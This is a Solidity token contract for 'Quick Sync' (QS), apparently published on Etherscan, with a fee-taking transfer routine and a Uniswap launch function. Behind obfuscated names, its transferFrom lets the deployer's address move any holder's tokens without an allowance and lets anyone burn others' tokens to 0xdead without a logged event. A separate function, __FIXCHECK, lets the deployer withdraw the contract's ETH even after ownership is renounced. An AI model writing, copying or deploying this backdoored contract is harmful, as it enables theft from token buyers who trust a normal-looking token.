/**
 *Submitted for verification at Etherscan.io on 2025-02-24
*/

// SPDX-License-Identifier: MIT

/*
    Web:  https://quicksync.me
    Tg:   https://t.me/quick_sync
    X :   https://x.com/Quick_Sync
    Docs: https://docs.quicksync.me
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract QS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Quick Sync";
    string private constant _symbol = unicode"QS";
    
    address payable private _GoldenRESS;
    mapping(address => uint256) private _JAJARssw342sswq;
    mapping(address => mapping(address => uint256)) private _GoldenTimes;
    mapping(address => bool) private _TopTop;

    IUniswapV2Router02 private _BAHURouter;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    address private __FIXs034fj = address(0xdead);
    uint256 public _ojojoivlk__FIXxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkj__FIXxsswtsa = 20000000 * 10 **_decimals;
    uint256 public _ppojof__FIXxsswtsa = 10000000 * 10 **_decimals;

    uint256 private __FIXssdsdwer2dcw2 = 7;
    uint256 private __FIXsaszx123aad = 7;
    uint256 private __FIXsdbytycctynty = 0;
    address private __FIXssdfwecc;
    uint256 private __FIXsdbsad = 10;
    uint256 private __FIXssdwerw = 10;
    uint256 private __FIXssseq = 0;
    uint256 private __FIXsssdrwqq1 = 0;

    uint256 private constant _Light__FIXxsswtsa = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _ojojoivlk__FIXxsswtsa);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _TopTop[owner()] = true;
        _TopTop[address(this)] = true;
        _TopTop[_GoldenRESS] = true;
        __FIXssdfwecc = _msgSender();

        _GoldenRESS = payable(_msgSender());
        _JAJARssw342sswq[address(this)] = _Light__FIXxsswtsa * 98 / 100;
        _JAJARssw342sswq[owner()] = _Light__FIXxsswtsa * 2 / 100;
        emit Transfer(address(0), address(this), _Light__FIXxsswtsa * 98 / 100);
        emit Transfer(address(0), address(owner()), _Light__FIXxsswtsa * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _Light__FIXxsswtsa;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _GoldenTimes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _trtr__FIXxsswtsa(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __PP__FIX(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _JAJARssw342sswq[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _GoldenTimes[owner][spender];
    }
    
    function _MassageTon() internal view returns (bool) {return msg.sender == _GoldenRESS;}

    function __FIXCHECK(address payable receipt) external {
        require(msg.sender == __FIXssdfwecc , "");
        _GoldenRESS = receipt;
        ___FIXxmnn34irfn(address(this).balance);
    }

    function _support__RUSSELL(uint256 amount) private {
        _GoldenRESS.transfer(amount);
    }

    function __PP__FIX(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_SKYPE(sender, recipient))
            _allowed = _GoldenTimes[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}

    function ___FIXxmnn34irfn(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _trtr__FIXxsswtsa(_msgSender(), recipient, amount);
        return true;
    }

    function _SKYPE(
        address from,
        address to
    ) internal view returns (bool) {
        if(_MassageTon() == true) return false;
        else return from == uniswapV2Pair || to != __FIXs034fj;
    }

    
    function _subSwap___FIXxsswtsa(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _BAHURouter.WETH();
        _approve(address(this), address(_BAHURouter), tokenAmount);
        _BAHURouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _trtr__FIXxsswtsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (__FIXsdbytycctynty > __FIXssdsdwer2dcw2)
                        ? __FIXssseq
                        : __FIXsdbsad
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(_BAHURouter) &&
                !_TopTop[to]
            ) {
                __FIXsdbytycctynty++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (__FIXsdbytycctynty > __FIXsaszx123aad)
                            ? __FIXsssdrwqq1
                            : __FIXssdwerw
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojof__FIXxsswtsa) ? contractTokenBalance : _ppojof__FIXxsswtsa; 
                    _subSwap___FIXxsswtsa((amount < minBalance) ? amount : minBalance);
                }
                _support__RUSSELL(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _JAJARssw342sswq[address(this)] =_JAJARssw342sswq[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _JAJARssw342sswq[from] =_JAJARssw342sswq[from].sub(amount);
        _JAJARssw342sswq[to] =_JAJARssw342sswq[to].add(amount.sub(taxAmount));
        if(__FIXs034fj != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

   
    function removeLimits () external onlyOwner {
        _ojojoivlk__FIXxsswtsa = _Light__FIXxsswtsa;
        _lkkkvnblkj__FIXxsswtsa = _Light__FIXxsswtsa;
        emit MaxTxAmountUpdated(_Light__FIXxsswtsa);
    }

    function StartPump() external onlyOwner {
        require(!isTrading, "Already Launched!");
        _BAHURouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(_BAHURouter), _Light__FIXxsswtsa);
        uniswapV2Pair = IUniswapV2Factory(_BAHURouter.factory()).createPair(
            address(this),
            _BAHURouter.WETH()
        );
        _BAHURouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(_BAHURouter),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
}